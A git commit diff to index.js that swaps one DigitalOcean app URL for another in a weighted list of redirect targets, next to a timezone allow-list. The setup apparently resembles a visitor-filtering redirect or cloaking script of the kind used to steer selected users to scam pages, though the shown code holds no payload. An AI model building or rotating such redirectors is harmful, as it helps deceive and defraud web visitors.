8e690615f1a140e9791e015a8e74a7c3ab474cdc
paalakash <palaksh452@gmail.com>
2026-07-17 06:56:18 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-t34ri.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://squid-app-s972p.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
